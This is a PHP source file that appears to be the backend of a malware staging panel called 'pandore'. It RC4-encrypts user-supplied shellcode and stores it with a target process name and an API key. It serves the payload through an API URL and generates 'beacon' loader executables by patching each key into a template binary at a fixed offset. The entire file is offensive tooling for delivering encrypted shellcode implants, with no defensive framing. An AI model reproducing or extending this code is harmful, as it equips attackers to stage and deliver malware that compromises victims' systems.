<?php 

function create_payload($title, $shellcode, $process)
{
    global $pdo;

    do 
    {
        $api_key = gen_rdn_str(32);

        $stmt = $pdo->prepare("SELECT * FROM payload WHERE api = :api_key");
        $stmt->bindParam(':api_key', $api_key, PDO::PARAM_STR);
        $stmt->execute();
    } while ($stmt->rowCount() > 0);

    $shellcode_array = str_to_hex_array($shellcode);
    $key_array = random_hex_array(64);

    $shellcode_array = rc4($shellcode_array, $key_array);

    foreach ($key_array as $hexa)
    {
        $hex_key_array[] = sprintf('0x%02X', $hexa);
    }

    $shellcode = implode(',', $shellcode_array);
    $rc4_key = implode(',', $hex_key_array);

    $stmt = $pdo->prepare('INSERT INTO payload (title, shellcode, rc4_key, process, created_by, api) VALUES (:title, :shellcode, :rc4_key, :process, :created_by, :api)');
    $stmt->bindParam(':title', $title, PDO::PARAM_STR);
    $stmt->bindParam(':shellcode', $shellcode, PDO::PARAM_STR);
    $stmt->bindParam(':rc4_key', $rc4_key, PDO::PARAM_STR);
    $stmt->bindParam(':process', $process, PDO::PARAM_STR);
    $stmt->bindParam(':created_by', $_SESSION['user_info']['id'], PDO::PARAM_STR);
    $stmt->bindParam(':api', $api_key, PDO::PARAM_STR);
    $stmt->execute();
}

function update_payload_content($payload_id, $new_content)
{
    global $pdo;

    $shellcode_array = str_to_hex_array($new_content);
    $key_array = random_hex_array(64);

    $shellcode_array = rc4($shellcode_array, $key_array);

    foreach ($key_array as $hexa)
    {
        $hex_key_array[] = sprintf('0x%02X', $hexa);
    }

    $shellcode = implode(',', $shellcode_array);
    $rc4_key = implode(',', $hex_key_array);

    $stmt = $pdo->prepare('UPDATE payload SET shellcode = :shellcode, rc4_key = :rc4_key WHERE id = :payload_id');
    $stmt->bindParam(':shellcode', $shellcode, PDO::PARAM_STR);
    $stmt->bindParam(':rc4_key', $rc4_key, PDO::PARAM_STR);
    $stmt->bindParam(':payload_id', $payload_id, PDO::PARAM_STR);
    $stmt->execute();
}

function update_payload_process($payload_id, $new_content)
{
    global $pdo;

    $stmt = $pdo->prepare('UPDATE payload SET process = :new_process WHERE id = :payload_id');
    $stmt->bindParam(':new_process', $new_content, PDO::PARAM_STR);
    $stmt->bindParam(':payload_id', $payload_id, PDO::PARAM_STR);
    $stmt->execute();
}

function new_payload($payload_id)
{
    global $pdo;
    $stmt = $pdo->prepare("SELECT * FROM payload WHERE id = :id");
    $stmt->bindParam(':id', $payload_id, PDO::PARAM_STR);
    $stmt->execute();
    
    $payload_info = $stmt->fetch(PDO::FETCH_ASSOC);

    $old_shellcode = str_to_hex_array($payload_info['shellcode']);
    $old_key = str_to_hex_array($payload_info['rc4_key']);

    $original_shellcode_string = rc4($old_shellcode, $old_key);

    $new_key = random_hex_array(64);

    $original_shellcode = array();
    foreach ($original_shellcode_string as $hexa) 
    {
        $value = hexdec($hexa);
        $original_shellcode[] = $value;
    }

    $new_shellcode = rc4($original_shellcode, $new_key);

    
    foreach ($new_key as $hexa) 
    {
        $hex_key_array[] = sprintf('0x%02X', $hexa);
    }

    $shellcode_db = implode(',', $new_shellcode);
    $rc4_key_db = implode(',', $hex_key_array);

    $stmt = $pdo->prepare("UPDATE payload SET shellcode = :shellcode, rc4_key = :rc4_key WHERE id = :id");
    $stmt->bindParam(':shellcode', $shellcode_db, PDO::PARAM_STR);
    $stmt->bindParam(':rc4_key', $rc4_key_db, PDO::PARAM_STR);
    $stmt->bindParam(':id', $payload_id, PDO::PARAM_INT);
    $stmt->execute();
}

function new_api_key($payload_id)
{
    global $pdo;

    do 
    {
        $api_key = gen_rdn_str(32);

        $stmt = $pdo->prepare("SELECT * FROM payload WHERE api = :api_key");
        $stmt->bindParam(':api_key', $api_key, PDO::PARAM_STR);
        $stmt->execute();
    } while ($stmt->rowCount() > 0);

    $stmt = $pdo->prepare("UPDATE payload SET api = :api WHERE id = :id");
    $stmt->bindParam(':api', $api_key, PDO::PARAM_STR);
    $stmt->bindParam(':id', $payload_id, PDO::PARAM_INT);
    $stmt->execute();
}

function get_payload()
{
    $user = $_SESSION['user_info']['id'];
    global $pdo;
    $stmt = $pdo->prepare("SELECT * FROM payload WHERE created_by = :uid");
    $stmt->bindParam(':uid', $user, PDO::PARAM_STR);
    $stmt->execute();

    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function delete_payload($payload_id)
{
    global $pdo;

    $stmt = $pdo->prepare("SELECT * FROM payload WHERE id = :id");
    $stmt->bindParam(':id', $payload_id, PDO::PARAM_STR);
    $stmt->execute();
    $payload = $stmt->fetch(PDO::FETCH_ASSOC);

    $stmt = $pdo->prepare("DELETE FROM payload WHERE id = :id");
    $stmt->bindParam(':id', $payload_id, PDO::PARAM_STR);
    $stmt->execute();
}

function get_payload_link($api_key)
{
    return "http://localhost/api/v1/get.php?id=" . $api_key;
}

function get_payload_number($user)
{
    global $pdo;
    $stmt = $pdo->prepare("SELECT COUNT(*) as payload_count FROM payload WHERE created_by = :uid");
    $stmt->bindParam(':uid', $user, PDO::PARAM_STR);
    $stmt->execute();

    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    return $result['payload_count'];
}

function build_loader($api_key)
{
    $sample_exe = 'files/pandore_app.exe';
	
    // get payload info
    global $pdo;
    $stmt = $pdo->prepare("SELECT * FROM payload WHERE api = :api");
    $stmt->bindParam(':api', $api_key, PDO::PARAM_STR);
    $stmt->execute();
    $payload_data = $stmt->fetch(PDO::FETCH_ASSOC);

    $new_beacon = 'files/temp/' . gen_rdn_str(8) . '.exe';

    copy($sample_exe, $new_beacon);

    $executableFile = fopen($new_beacon, 'r+');

    $replacementString = pack('a*', $payload_data['api']);
    $bytesToReplace = 32;
    $offsetToReplace = 0x89508;
    fseek($executableFile, $offsetToReplace);
    fwrite($executableFile, $replacementString, $bytesToReplace);

    fclose($executableFile);

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.'pandore-'.basename($new_beacon));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize($new_beacon));
    ob_clean();
    flush();

    readfile($new_beacon);
    unlink($new_beacon);
}

?>